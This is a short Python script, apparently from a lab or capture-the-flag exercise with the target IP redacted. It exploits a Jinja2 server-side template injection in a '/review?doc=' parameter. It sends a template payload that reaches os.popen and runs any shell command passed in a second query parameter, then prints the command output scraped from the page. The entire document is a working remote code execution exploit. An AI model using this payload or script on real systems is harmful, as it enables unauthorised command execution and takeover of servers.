#!/usr/bin/env python3
# Keystone SSTI command runner.
# The /review?doc= parameter is rendered as a Jinja2 template. We pass the
# command in a second query parameter (x) so shell quotes don't have to be
# nested inside the template expression.
# NOTE: TARGET redacted -- set it to your instance IP.
import html
import re
import sys

import requests

TARGET = "http://<TARGET>"  # e.g. http://10.10.10.10  (redacted)
cmd = " ".join(sys.argv[1:]) or "id"
payload = "{{cycler.__init__.__globals__.os.popen(request.args.get('x')).read()}}"
r = requests.get(TARGET + "/review", params={"doc": payload, "x": cmd}, timeout=15)
r.raise_for_status()
m = re.search(r"Requested:\s*(.*?)</p>", r.text, re.S)
print(html.unescape(m.group(1)) if m else r.text)
